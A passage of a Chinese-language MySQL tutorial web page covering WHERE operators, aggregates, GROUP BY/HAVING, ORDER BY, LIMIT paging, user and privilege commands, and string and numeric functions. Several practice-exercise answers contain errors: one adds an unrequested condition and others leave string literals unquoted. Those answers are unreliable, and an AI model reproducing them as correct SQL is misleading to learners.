       <tr align="center">            <td><=</td>            <td>小于等于</td>        </tr>        <tr align="center">            <td>=</td>            <td>等于</td>        </tr>        <tr align="center">            <td><> 或 !=</td>            <td>不等于</td>        </tr>         <tr align="center">            <td>BETWEEN ... AND ...</td>            <td>在某个范围之内(含最小、最大值)</td>        </tr>        <tr align="center">            <td>IN(...)</td>            <td>在in之后的列表中的值，多选一</td>        </tr>        <tr align="center">            <td>LIKE 占位符</td>            <td>模糊匹配(_匹配单个字符, %匹配任意个字符)</td>        </tr>        <tr align="center">            <td>IS NULL</td>            <td>是NULL</td>        </tr>    </table></div><div class="tip info"><p>条件—-&gt;常用的逻辑运算符如下:</p></div><div>    <table style="background-color:#fff;">        <tr align="center">            <td>逻辑运算符 </td>            <td>功能</td>        </tr>        <tr align="center">            <td>AND 或 && </td>            <td>并且 (多个条件同时成立)</td>        </tr>        <tr align="center">            <td>OR 或 || </td>            <td>或者 (多个条件任意一个成立)</td>        </tr>        <tr align="center">            <td>NOT 或 ! </td>            <td>非 , 不是</td>        </tr>       </table></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">案例:</span><br><span class="line"></span><br><span class="line">A. 查询年龄等于 <span class="number">88</span> 的员工</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> age <span class="operator">=</span> <span class="number">88</span>;</span><br><span class="line"></span><br><span class="line">B. 查询年龄小于 <span class="number">20</span> 的员工信息</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> age <span class="operator">&lt;</span> <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">C. 查询年龄小于等于 <span class="number">20</span> 的员工信息</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> age <span class="operator">&lt;=</span> <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">D. 查询没有身份证号的员工信息</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> idcard <span class="keyword">is</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">E. 查询有身份证号的员工信息</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> idcard <span class="keyword">is</span> <span class="keyword">not</span> <span class="keyword">null</span>;</span><br><span class="line"></span><br><span class="line">F. 查询年龄不等于 <span class="number">88</span> 的员工信息</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> age <span class="operator">!=</span> <span class="number">88</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> age <span class="operator">&lt;&gt;</span> <span class="number">88</span>;</span><br><span class="line"></span><br><span class="line">G. 查询年龄在<span class="number">15</span>岁(包含) 到 <span class="number">20</span>岁(包含)之间的员工信息</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> age <span class="operator">&gt;=</span> <span class="number">15</span> <span class="operator">&amp;&amp;</span> age <span class="operator">&lt;=</span> <span class="number">20</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> age <span class="operator">&gt;=</span> <span class="number">15</span> <span class="keyword">and</span> age <span class="operator">&lt;=</span> <span class="number">20</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> age <span class="keyword">between</span> <span class="number">15</span> <span class="keyword">and</span> <span class="number">20</span>;</span><br><span class="line"></span><br><span class="line">H. 查询性别为 女 且年龄小于 <span class="number">25</span>岁的员工信息</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> gender <span class="operator">=</span> <span class="string">&#x27;女&#x27;</span> <span class="keyword">and</span> age <span class="operator">&lt;</span> <span class="number">25</span>;</span><br><span class="line"></span><br><span class="line">I. 查询年龄等于<span class="number">18</span> 或 <span class="number">20</span> 或 <span class="number">40</span> 的员工信息</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> age <span class="operator">=</span> <span class="number">18</span> <span class="keyword">or</span> age <span class="operator">=</span> <span class="number">20</span> <span class="keyword">or</span> age <span class="operator">=</span><span class="number">40</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> age <span class="keyword">in</span>(<span class="number">18</span>,<span class="number">20</span>,<span class="number">40</span>);</span><br><span class="line"></span><br><span class="line">J. 查询姓名为两个字的员工信息 _ <span class="operator">%</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> name <span class="keyword">like</span> <span class="string">&#x27;__&#x27;</span>;</span><br><span class="line"></span><br><span class="line">K. 查询身份证号最后一位是X的员工信息</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> idcard <span class="keyword">like</span> <span class="string">&#x27;%X&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">where</span> idcard <span class="keyword">like</span> <span class="string">&#x27;_________________X&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="聚合函数"><a href="#聚合函数" class="headerlink" title="聚合函数"></a>聚合函数</h3><div style="text-indent:2em;"><font size="4">概念：将一列数据作为一个整体，进行纵向计算 。</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语法</span><br><span class="line"><span class="keyword">SELECT</span> 聚合函数(字段列表) <span class="keyword">FROM</span> 表名 ;</span><br></pre></td></tr></table></figure><div class="tip info"><p>注意 : NULL值是不参与所有聚合函数运算的。</p></div><div style="text-indent:2em;"><font size="4"><b>常见的聚合函数</b></font></div><div>    <table style="background-color:#fff;">        <tr align="center">            <td>函数 </td>            <td>功能</td>        </tr>        <tr align="center">            <td>count </td>            <td>统计数量</td>        </tr>        <tr align="center">            <td>max</td>            <td>最大值</td>        </tr>        <tr align="center">            <td>min</td>            <td>最小值</td>        </tr>           <tr align="center">            <td>avg</td>            <td>平均值</td>        </tr>          <tr align="center">            <td>sum</td>            <td>求和</td>        </tr>      </table></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">案例：</span><br><span class="line">A. 统计该企业员工数量</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> emp; <span class="comment">-- 统计的是总记录数</span></span><br><span class="line"><span class="keyword">select</span> <span class="built_in">count</span>(idcard) <span class="keyword">from</span> emp; <span class="comment">-- 统计的是idcard字段不为null的记录数</span></span><br><span class="line"></span><br><span class="line">B. 统计该企业员工的平均年龄</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">avg</span>(age) <span class="keyword">from</span> emp;</span><br><span class="line"></span><br><span class="line">C. 统计该企业员工的最大年龄</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">max</span>(age) <span class="keyword">from</span> emp;</span><br><span class="line"></span><br><span class="line">D. 统计该企业员工的最小年龄</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">min</span>(age) <span class="keyword">from</span> emp;</span><br><span class="line"></span><br><span class="line">E. 统计西安地区员工的年龄之和</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">sum</span>(age) <span class="keyword">from</span> emp <span class="keyword">where</span> workaddress <span class="operator">=</span> <span class="string">&#x27;西安&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="分组查询"><a href="#分组查询" class="headerlink" title="分组查询"></a>分组查询</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语法</span><br><span class="line"><span class="keyword">SELECT</span> 字段列表 <span class="keyword">FROM</span> 表名 [ <span class="keyword">WHERE</span> 条件 ] <span class="keyword">GROUP</span> <span class="keyword">BY</span> 分组字段名 [ <span class="keyword">HAVING</span> 分组后过滤条件 ];</span><br></pre></td></tr></table></figure><div><font size="4"><B>where与having区别</B></font></div><ul><li><div><font size="4">执行时机不同：where是分组之前进行过滤，不满足where条件，不参与分组；而having是分组 之后对结果进行过滤。</font></div></li><li><div><font size="4">判断条件不同：where不能对聚合函数进行判断，而having可以。</font></div></li></ul><blockquote><div><font size="4">注意事项: </font></div><div><font size="4">• 分组之后，查询的字段一般为聚合函数和分组字段，查询其他字段无任何意义。</font></div><div><font size="4">• 执行顺序: where > 聚合函数 > having 。</font></div><div><font size="4">• 支持多字段分组, 具体语法为 : group by columnA,columnB</font></div></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">案例:</span><br><span class="line">A. 根据性别分组 , 统计男性员工 和 女性员工的数量</span><br><span class="line"><span class="keyword">select</span> gender, <span class="built_in">count</span>(<span class="operator">*</span>) <span class="keyword">from</span> emp <span class="keyword">group</span> <span class="keyword">by</span> gender ;</span><br><span class="line"></span><br><span class="line">B. 根据性别分组 , 统计男性员工 和 女性员工的平均年龄</span><br><span class="line"><span class="keyword">select</span> gender, <span class="built_in">avg</span>(age) <span class="keyword">from</span> emp <span class="keyword">group</span> <span class="keyword">by</span> gender ;</span><br><span class="line"></span><br><span class="line">C. 查询年龄小于<span class="number">45</span>的员工 , 并根据工作地址分组 , 获取员工数量大于等于<span class="number">3</span>的工作地址</span><br><span class="line"><span class="keyword">select</span> workaddress, <span class="built_in">count</span>(<span class="operator">*</span>) address_count <span class="keyword">from</span> emp <span class="keyword">where</span> age <span class="operator">&lt;</span> <span class="number">45</span> <span class="keyword">group</span> <span class="keyword">by</span> workaddress <span class="keyword">having</span> address_count <span class="operator">&gt;=</span> <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">D. 统计各个工作地址上班的男性及女性员工的数量</span><br><span class="line"><span class="keyword">select</span> workaddress, gender, <span class="built_in">count</span>(<span class="operator">*</span>) <span class="string">&#x27;数量&#x27;</span> <span class="keyword">from</span> emp <span class="keyword">group</span> <span class="keyword">by</span> gender , workaddress;</span><br></pre></td></tr></table></figure><h3 id="排序查询"><a href="#排序查询" class="headerlink" title="排序查询"></a>排序查询</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语法</span><br><span class="line"><span class="keyword">SELECT</span> 字段列表 <span class="keyword">FROM</span> 表名 <span class="keyword">ORDER</span> <span class="keyword">BY</span> 字段<span class="number">1</span> 排序方式<span class="number">1</span> , 字段<span class="number">2</span> 排序方式<span class="number">2</span> ;</span><br></pre></td></tr></table></figure><div><font size="4">排序方式</font></div><div><font size="4">•ASC : 升序(默认值) </font></div><div><font size="4">•DESC: 降序</font></div><blockquote><div><font size="4">注意事项：</font></div><div><font size="4">• 如果是升序, 可以不指定排序方式ASC ; </font></div><div><font size="4">• 如果是多字段排序，当第一个字段值相同时，才会根据第二个字段进行排序 ;</font></div></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">案例:</span><br><span class="line">A. 根据年龄对公司的员工进行升序排序</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">order</span> <span class="keyword">by</span> age <span class="keyword">asc</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">order</span> <span class="keyword">by</span> age;</span><br><span class="line"></span><br><span class="line">B. 根据入职时间, 对员工进行降序排序</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">order</span> <span class="keyword">by</span> entrydate <span class="keyword">desc</span>;</span><br><span class="line"></span><br><span class="line">C. 根据年龄对公司的员工进行升序排序 , 年龄相同 , 再按照入职时间进行降序排序</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp <span class="keyword">order</span> <span class="keyword">by</span> age <span class="keyword">asc</span> , entrydate <span class="keyword">desc</span>;</span><br></pre></td></tr></table></figure><h3 id="分页查询"><a href="#分页查询" class="headerlink" title="分页查询"></a>分页查询</h3><div style="text-indent:2em;"><font size="4">分页操作在业务系统开发时，也是非常常见的一个功能，我们在网站中看到的各种各样的分页条，后台 都需要借助于数据库的分页操作。</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">语法</span><br><span class="line"><span class="keyword">SELECT</span> 字段列表 <span class="keyword">FROM</span> 表名 LIMIT 起始索引, 查询记录数 ;</span><br></pre></td></tr></table></figure><blockquote><div><font size="4">注意事项:</font></div><div><font size="4">• 起始索引从0开始，起始索引 = （查询页码 - 1）* 每页显示记录数。 </font></div><div><font size="4">• 分页查询是数据库的方言，不同的数据库有不同的实现，MySQL中是LIMIT。 </font></div><div><font size="4">• 如果查询的是第一页数据，起始索引可以省略，直接简写为 limit 10。</font></div></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">案例:</span><br><span class="line">A. 查询第<span class="number">1</span>页员工数据, 每页展示<span class="number">10</span>条记录</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp limit <span class="number">0</span>,<span class="number">10</span>;</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp limit <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">B. 查询第<span class="number">2</span>页员工数据, 每页展示<span class="number">10</span>条记录 <span class="comment">--------&gt; (页码-1)*页展示记录数</span></span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> emp limit <span class="number">10</span>,<span class="number">10</span>;</span><br></pre></td></tr></table></figure><h3 id="DQL执行顺序"><a href="#DQL执行顺序" class="headerlink" title="DQL执行顺序"></a>DQL执行顺序</h3><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221009183241020.png" alt="image-20221009183241020"></p><h3 id="DQL操作练习"><a href="#DQL操作练习" class="headerlink" title="DQL操作练习"></a>DQL操作练习</h3><div><font size="4"><b>1、查询年龄为20,21,22,23岁的员工信息。</b></font></div><div><font size="4">答案：<psw>select * from emp where gender = 女 and age in(20,21,22,23);</psw></font></div><div><font size="4"><b>2、查询性别为 男 ，并且年龄在 20-40 岁(含)以内的姓名为三个字的员工。</b></font></div><div><font size="4">答案：<psw>select * from emp where gender = 男 and ( age between 20 and 40 ) and name like ___;</psw></font></div><div><font size="4"><b>3、统计员工表中, 年龄小于60岁的 , 男性员工和女性员工的人数。</b></font></div><div><font size="4">答案：<psw>select gender, count(*) from emp where age < 60 group by gender;</psw></font></div><div><font size="4"><b>4、 查询所有年龄小于等于35岁员工的姓名和年龄，并对查询结果按年龄升序排序，如果年龄相同按 入职时间降序排序。</b></font></div><div><font size="4">答案：<psw>select name , age from emp where age <= 35 order by age asc , entrydate desc;</psw></font></div><div><font size="4"><b>5、查询性别为男，且年龄在20-40 岁(含)以内的前5个员工信息，对查询的结果按年龄升序排序， 年龄相同按入职时间升序排序。</b></font></div><div><font size="4">答案：<psw>select * from emp where gender = 男 and age between 20 and 40 order by age asc , entrydate asc limit 5 ;</psw></font></div><hr><h2 id="DCL"><a href="#DCL" class="headerlink" title="DCL"></a>DCL</h2><div style="text-indent:2em;"><font size="4">DCL英文全称是Data Control Language(数据控制语言)，用来管理数据库用户、控制数据库的访 问权限。</font></div><h3 id="管理用户"><a href="#管理用户" class="headerlink" title="管理用户"></a>管理用户</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询用户</span><br><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> mysql.user;</span><br></pre></td></tr></table></figure><div><font size="4">查询的结果如下:</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221009181615331.png" alt="image-20221009181615331"></p><div style="text-indent:2em;"><font size="4">其中 Host代表当前用户访问的主机, 如果为localhost, 仅代表只能够在当前本机访问，是不可以 远程访问的。 User代表的是访问该数据库的用户名。在MySQL中需要通过Host和User来唯一标识一 个用户。</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">创建用户</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;用户名&#x27;</span>@<span class="string">&#x27;主机名&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;密码&#x27;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">修改用户密码</span><br><span class="line"> <span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&#x27;用户名&#x27;</span>@<span class="string">&#x27;主机名&#x27;</span> IDENTIFIED <span class="keyword">WITH</span> mysql_native_password <span class="keyword">BY</span> <span class="string">&#x27;新密码&#x27;</span> ;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">删除用户</span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">USER</span> <span class="string">&#x27;用户名&#x27;</span>@<span class="string">&#x27;主机名&#x27;</span> ;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">案例：</span><br><span class="line">A. 创建用户xiaoshi, 只能够在当前主机localhost访问, 密码<span class="number">123456</span>;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> <span class="string">&#x27;xiaoshi&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> identified <span class="keyword">by</span> <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"></span><br><span class="line">B. 创建用户hours, 可以在任意主机访问该数据库, 密码<span class="number">123456</span>;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> <span class="string">&#x27;hours&#x27;</span>@<span class="string">&#x27;%&#x27;</span> identified <span class="keyword">by</span> <span class="string">&#x27;123456&#x27;</span>;</span><br><span class="line"></span><br><span class="line">C. 修改用户hours的访问密码为<span class="number">1234</span>;</span><br><span class="line"><span class="keyword">alter</span> <span class="keyword">user</span> <span class="string">&#x27;hours&#x27;</span>@<span class="string">&#x27;%&#x27;</span> identified <span class="keyword">with</span> mysql_native_password <span class="keyword">by</span> <span class="string">&#x27;1234&#x27;</span>;</span><br><span class="line"></span><br><span class="line">D. 删除 xiaoshi<span class="variable">@localhost</span> 用户</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">user</span> <span class="string">&#x27;xiaoshi&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span>;</span><br></pre></td></tr></table></figure><h3 id="权限控制"><a href="#权限控制" class="headerlink" title="权限控制"></a>权限控制</h3><div style="text-indent:2em;"><font size="4">MySQL中定义了很多种权限，但是常用的就以下几种：</font></div><div>    <table style="background-color:#fff;">        <tr align="center">            <td>权限 </td>            <td>说明</td>        </tr>        <tr align="center">            <td>ALL, ALL PRIVILEGES</td>            <td>所有权限</td>        </tr>        <tr align="center">            <td>SELECT</td>            <td>查询数据</td>        </tr>        <tr align="center">            <td>INSERT</td>            <td>插入数据</td>        </tr>           <tr align="center">            <td>UPDATE</td>            <td>修改数据</td>        </tr>          <tr align="center">            <td>DELETE</td>            <td>删除数据</td>        </tr>          <tr align="center">            <td>ALTER</td>            <td>修改表</td>        </tr>          <tr align="center">            <td>DROP</td>            <td>删除数据库/表/视图</td>        </tr>          <tr align="center">            <td>CREATE</td>            <td>创建数据库/表</td>        </tr>      </table></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查询权限</span><br><span class="line"><span class="keyword">SHOW</span> GRANTS <span class="keyword">FOR</span> <span class="string">&#x27;用户名&#x27;</span>@<span class="string">&#x27;主机名&#x27;</span> ;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">授予权限</span><br><span class="line"><span class="keyword">GRANT</span> 权限列表 <span class="keyword">ON</span> 数据库名.表名 <span class="keyword">TO</span> <span class="string">&#x27;用户名&#x27;</span>@<span class="string">&#x27;主机名&#x27;</span>;</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">撤销权限</span><br><span class="line"><span class="keyword">REVOKE</span> 权限列表 <span class="keyword">ON</span> 数据库名.表名 <span class="keyword">FROM</span> <span class="string">&#x27;用户名&#x27;</span>@<span class="string">&#x27;主机名&#x27;</span>;</span><br></pre></td></tr></table></figure><blockquote><div><font size="4">注意事项： </font></div><div><font size="4">• 多个权限之间，使用逗号分隔 </font></div><div><font size="4">• 授权时， 数据库名和表名可以使用 * 进行通配，代表所有。</font></div></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">案例:</span><br><span class="line">A. 查询 <span class="string">&#x27;hours&#x27;</span>@<span class="string">&#x27;%&#x27;</span> 用户的权限</span><br><span class="line"><span class="keyword">show</span> grants <span class="keyword">for</span> <span class="string">&#x27;hours&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br><span class="line"></span><br><span class="line">B. 授予 <span class="string">&#x27;hours&#x27;</span>@<span class="string">&#x27;%&#x27;</span> 用户hours数据库所有表的所有操作权限</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">on</span> hours.<span class="operator">*</span> <span class="keyword">to</span> <span class="string">&#x27;hours&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br><span class="line"></span><br><span class="line">C. 撤销 <span class="string">&#x27;hours&#x27;</span>@<span class="string">&#x27;%&#x27;</span> 用户的hours数据库的所有权限</span><br><span class="line"><span class="keyword">revoke</span> <span class="keyword">all</span> <span class="keyword">on</span> hours.<span class="operator">*</span> <span class="keyword">from</span> <span class="string">&#x27;hours&#x27;</span>@<span class="string">&#x27;%&#x27;</span>;</span><br></pre></td></tr></table></figure><hr><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><div style="text-indent:2em;"><font size="4">函数 是指一段可以直接被另一段程序调用的程序或代码。 也就意味着，这一段程序或代码在MySQL中已经给我们提供了，我们要做的就是在合适的业务场景调用对应的函数完成对应的业务需求即可。</font></div><div style="text-indent:2em;"><font size="4">MySQL中的函数主要分为以下四类： 字符串函数、数值函数、日期函数、流程函数。</font></div><h2 id="字符串函数"><a href="#字符串函数" class="headerlink" title="字符串函数"></a>字符串函数</h2><div style="text-indent:2em;"><font size="4">MySQL中内置了很多字符串函数，常用的几个如下：</font></div><div>    <table style="background-color:#fff;">        <tr align="center">            <td>函数</td>            <td>功能</td>        </tr>        <tr align="center">            <td>CONCAT(S1,S2,...Sn)</td>            <td>字符串拼接，将S1，S2，... Sn拼接成一个字符串</td>        </tr>        <tr align="center">            <td>LOWER(str)</td>            <td>将字符串str全部转为小写</td>        </tr>        <tr align="center">            <td>UPPER(str)</td>            <td>将字符串str全部转为大写</td>        </tr>           <tr align="center">            <td>LPAD(str,n,pad)</td>            <td>左填充，用字符串pad对str的左边进行填充，达到n个字符串长度</td>        </tr>          <tr align="center">            <td>RPAD(str,n,pad)</td>            <td>右填充，用字符串pad对str的右边进行填充，达到n个字符串长度</td>        </tr>          <tr align="center">            <td>TRIM(str)</td>            <td>去掉字符串头部和尾部的空格</td>        </tr>          <tr align="center">            <td>SUBSTRING(str,start,len)</td>            <td>返回从字符串str从start位置起的len个长度的字符串</td>    </table></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">示例：</span><br><span class="line">A. concat : 字符串拼接</span><br><span class="line"><span class="keyword">select</span> concat(<span class="string">&#x27; Hello&#x27;</span> , <span class="string">&#x27; MySQL&#x27;</span>);</span><br><span class="line"></span><br><span class="line">B. lower : 全部转小写</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">lower</span>(<span class="string">&#x27;Hello&#x27;</span>);</span><br><span class="line"></span><br><span class="line">C. upper : 全部转大写</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">upper</span>(<span class="string">&#x27;Hello&#x27;</span>);</span><br><span class="line"></span><br><span class="line">D. lpad : 左填充</span><br><span class="line"><span class="keyword">select</span> lpad(<span class="string">&#x27;01&#x27;</span>, <span class="number">5</span>, <span class="string">&#x27;-&#x27;</span>);</span><br><span class="line"></span><br><span class="line">E. rpad : 右填充</span><br><span class="line"><span class="keyword">select</span> rpad(<span class="string">&#x27;01&#x27;</span>, <span class="number">5</span>, <span class="string">&#x27;-&#x27;</span>);</span><br><span class="line"></span><br><span class="line">F. trim : 去除空格</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">trim</span>(<span class="string">&#x27; Hello MySQL &#x27;</span>);</span><br><span class="line"></span><br><span class="line">G. substring : 截取子字符串</span><br><span class="line"><span class="keyword">select</span> <span class="built_in">substring</span>(<span class="string">&#x27; Hello MySQL&#x27;</span>,<span class="number">1</span>,<span class="number">5</span>);</span><br></pre></td></tr></table></figure><div style="text-indent:2em;"><font size="4">案例：由于业务需求变更，企业员工的工号，统一为5位数，目前不足5位数的全部在前面补0。比如： 1号员工的工号应该为00001。</font></div><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">update</span> emp <span class="keyword">set</span> workno <span class="operator">=</span> lpad(workno, <span class="number">5</span>, <span class="string">&#x27;0&#x27;</span>);</span><br></pre></td></tr></table></figure><div style="text-indent:2em;"><font size="4">处理完毕后, 具体的数据为:</font></div><p><img src="https://sss-imag-host.oss-cn-shanghai.aliyuncs.com/image-20221013161221415.png" alt="image-20221013161221415"></p><h2 id="数值函数"><a href="#数值函数" class="headerlink" title="数值函数"></a>数值函数</h2><div style="text-indent:2em;"><font size="4">常见的数值函数如下：</font></div><div>    <table style="background-color:#fff;">        <tr align="center">            <td>函数</td>            <td>功能</td>        </tr>        <tr align="center">            <td>CEIL(x)</td>            <td>向上取整</td>        </tr>        <tr align="center">            <td>FLOOR(x)</td>            <td>向下取整</td>        </tr>        <tr align="center">            <td>MOD(x,y)</td>            <td>返回x/y的模</td>        </tr>           <tr align="center">            